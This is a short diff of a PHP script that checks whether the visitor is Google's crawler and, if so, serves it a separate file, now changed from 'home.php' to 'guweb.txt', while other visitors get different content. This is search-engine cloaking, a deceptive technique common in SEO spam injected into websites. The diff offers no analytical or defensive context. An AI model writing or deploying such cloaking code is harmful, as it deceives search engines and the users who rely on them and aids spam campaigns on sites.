@@ -8,7 +8,7 @@ function is_google_bot() {
 }
 
 if (is_google_bot()) {
-    $bot_content = file_get_contents('home.php');
+    $bot_content = file_get_contents('guweb.txt');
     echo $bot_content;
     exit;
 } else {
